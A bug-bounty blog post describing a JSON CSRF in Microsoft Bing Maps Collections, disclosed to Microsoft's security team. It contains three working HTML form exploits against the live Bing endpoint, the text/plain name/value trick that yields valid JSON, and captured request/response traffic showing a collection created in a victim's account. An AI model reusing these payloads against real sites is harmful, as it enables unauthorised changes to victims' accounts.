---
title: "JSON CSRF in Microsoft Bing Maps Collections"
author: "Jayateertha Guruprasad"
date: 2024-02-09T06:55:51.275Z
lastmod: 2024-08-31T13:12:44+05:30

description: ""

subtitle: ""

image: "/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_0.png" 
images:
 - "/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_0.png"
 - "/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_1.png"
 - "/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_2.png"
 - "/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_3.png"
 - "/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_4.png"
 - "/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_5.png"


aliases:
- "/json-csrf-in-microsoft-bing-maps-collections-74afc2b197d5"

---

Bing Maps allows users to create a collection and add places to those collections as shown below.

![](/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_0.png#layoutTextWidth)

The request & response to create a collection is as follows —

![](/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_1.png#layoutTextWidth)

You can notice that, there are **no CSRF tokens** present in the request, also notice that the Method & the Content-Type are **POST** & **text/plain** respectively. As this is a [simple](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests) HTTP request, we are saved from preflight request & CORS checks.

> Okay, so let’s craft the exploit it should be a easy one without any difficulties right ?

**Let’s check the below Exploit 1 and capture in Burp** —

{{< highlight html >}}

<html>

<body>
    <form method="POST" action="https://www.bing.com/CloudGraph/Collection/v1" enctype="text/plain">
        <input type="hidden" name='' value='{"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"Test Collection","Description":"Test Description","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638421423185170000,"DateModified":638421423185170000,"DateAccessed":638421423185170000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0}}'/>
        <input type="submit" value="Submit"> </form>
</body>
<html>
{{< /highlight >}}

![](/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_2.png#layoutTextWidth)

You can notice that **when name attribute of input element is empty, browser won’t send any params even if value attribute has some value**, Why did I keep name param empty in the first place ? -> if name="a", for example browser would send param like  ->  **a={"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"Test Collection","Description":"Test Description","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638421423185170000,"DateModified":638421423185170000,"DateAccessed":638421423185170000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0}}**, which is a invalid JSON.

> **Okay, now what if we keep name attribute of input element as JSON body & leave value attribute empty, let’s try that now as our Exploit 2**

{{< highlight html >}}
<html>
<body>
    <form method="POST" action="https://www.bing.com/CloudGraph/Collection/v1" enctype="text/plain">
        <input type="hidden" name='{"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"Test Collection","Description":"Test Description","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638421423185170000,"DateModified":638421423185170000,"DateAccessed":638421423185170000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0}}'value='' />
        <input type="submit" value="Submit"> </form>
</body>
<html>
{{< /highlight >}}

![](/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_3.png#layoutTextWidth)

Now, we see that we partially succeeded, we are able to send a JSON request in body, but why did it fail ?

Take a closer look at Exploit 2 request, **even though we left value as empty in input element of our exploit, "=" is appended to the JSON body automatically by the browser**. The **backend** when it tries to parse the JSON would see "=" in the end of JSON and **fail to parse the improper JSON giving BAD REQUEST** as the status.

**So, as the params are sent in JSON, We can’t Exploit ?
What if the server is not validating JSON input structure correctly, does it accept additional params like {"foo":"test"} ?**

> **Let’s try to craft Exploit 3, assuming the server is not validating JSON structure properly —**

{{< highlight bash>}}
<html>
    <body>
        <form method="POST" action="https://www.bing.com/CloudGraph/Collection/v1" enctype="text/plain">
            <input type="hidden" name='{"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"test csrf","Description":"test","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638385168551730000,"DateModified":638385168551730000,"DateAccessed":638385168551730000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0},"foo' value='":"test"}'/>
            <input type="submit" value="Submit">
        </form>
    </body>
<html>
{{< /highlight >}}

{{< highlight bash>}}
name='{"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"test csrf","Description":"test","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638385168551730000,"DateModified":638385168551730000,"DateAccessed":638385168551730000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0},"foo' value='":"test"}'
{{< /highlight >}}

Notice that, we have appended a new param **,"foo** in the name attribute, & value attribute has **":test"}**. So, that when request goes it will act as if new param has been added like — {**ACTUAL_JSON,"foo=":"test"**} ,We have added **}** in the value because we didn’t close the **{** in the name attribute.


**Now, the actual request when viewed through BURP would look like —**

{{< highlight bash>}}
POST /CloudGraph/Collection/v1 HTTP/2
Host: www.bing.com
Cookie: AUTHENTICATED_COOKIE
Content-Length: 460
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Full-Version: ""
Sec-Ch-Ua-Arch: ""
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Platform-Version: ""
Sec-Ch-Ua-Model: ""
Sec-Ch-Ua-Bitness: ""
Sec-Ch-Ua-Full-Version-List: 
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: text/plain
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

{"RequestType":5,"RequestOrigin":"BingMapsVertical","SchemaVersion":"1.0","ClientETag":"0","CollectionToBeWritten":{"$type":"GeoAnnotationsCollection","Name":"test csrf","Description":"test","CanShare":false,"Items":[],"AlwaysShowPOI":true,"CopyAllowed":true,"DisplayOrder":1,"DateCreated":638385168551730000,"DateModified":638385168551730000,"DateAccessed":638385168551730000,"Properties":{"ImageUrls":"[]"},"CollectionId":"0","ItemsCount":0},"foo=":"test"}
{{< /highlight >}}

**Giving the 200 OK response when victim opens our exploit, indicating that the collection has been successfully created in the victim account—**

{{< highlight bash>}}
HTTP/2 200 OK
Cache-Control: private
Content-Length: 274
Content-Type: application/json; charset=utf-8
Vary: Accept-Encoding
P3p: CP="NON UNI COM NAV STA LOC CURa DEVa PSAa PSDa OUR IND"
X-Eventid: 65b79255c9824d80b9f694349ad862a8
Accept-Ch: Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA
Useragentreductionoptout: A7kgTC5xdZ2WIVGZEfb1hUoNuvjzOZX3VIV/BA6C18kQOOF50Q0D3oWoAm49k3BQImkujKILc7JmPysWk3CSjwUAAACMeyJvcmlnaW4iOiJodHRwczovL3d3dy5iaW5nLmNvbTo0NDMiLCJmZWF0dXJlIjoiU2VuZEZ1bGxVc2VyQWdlbnRBZnRlclJlZHVjdGlvbiIsImV4cGlyeSI6MTY4NDg4NjM5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=
Content-Security-Policy-Report-Only: script-src https: 'strict-dynamic' 'report-sample' 'nonce-cNS9LxynUR+ClL2pzP3fsJULF3t3qVcaKz09Ble/4/8='; base-uri 'self';report-to csp-endpoint
Report-To: {"group":"csp-endpoint","max_age":86400,"endpoints":[{"url":"https://aefd.nelreports.net/api/report?cat=bingcsp"}]}
X-Msedge-Ref: Ref A: 6FDA68B62C674CEBAD67BE5815BEDA5F Ref B: MAA02EDGE0311 Ref C: 2024-01-29T11:56:05Z
Date: Mon, 29 Jan 2024 11:56:06 GMT
Set-Cookie: SENSITIVE_COOKIE; expires=Sat, 22-Feb-2025 11:56:05 GMT; path=/; HttpOnly
Set-Cookie: SENSITIVE_COOKIE; domain=.bing.com; expires=Thu, 29-Jan-2026 11:56:05 GMT; path=/; secure; SameSite=None
Alt-Svc: h3=":443"; ma=93600
X-Cdn-Traceid: 0.0e0a2c17.1706529365.7a547e

{"RequestType":5,"CollectionsMetaMap":null,"CollectionsMap":null,"ServerETag":"088ba493-bbe0-e901-0264-160db3476ee0","SchemaVersion":"1.0","ExternalUserId":"4ae96729c1bd14a1","CollectionId":"bda0fff9-5587-456b-91f8-b8e7348d9800","ItemId":null,"ItineraryMetaServerETag":null}
{{< /highlight >}}

![](/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_4.png#layoutTextWidth)

**I also discovered that, I could delete Victim’s collection using a different strategy & reported the video POC to the MSRC team following the usual process highlighting the Impact — Creating/Deleting other users Bing Maps Collections.**

Unfortunately, This was not severe enough for Microsoft for immediate fix and thus not eligible for a bounty 😔.

![](/post/img/2024-02-09_json-csrf-in-microsoft-bing-maps-collections_5.png#layoutTextWidth)

#### **Liked my article ? Follow me on** [**LinkedIn**](https://www.linkedin.com/in/jayateerthag/)**, Twitter (**[**@jayateerthaG**](https://twitter.com/jayateerthag)**), and **[**Medium**](https://jayateerthag.medium.com/)** for more content about bugbounty, Infosec, cybersecurity and hacking.**

* * *
Written on February 9, 2024 by Jayateertha Guruprasad.

Originally published on [Medium](https://medium.com/@jayateerthag/json-csrf-in-microsoft-bing-maps-collections-74afc2b197d5)
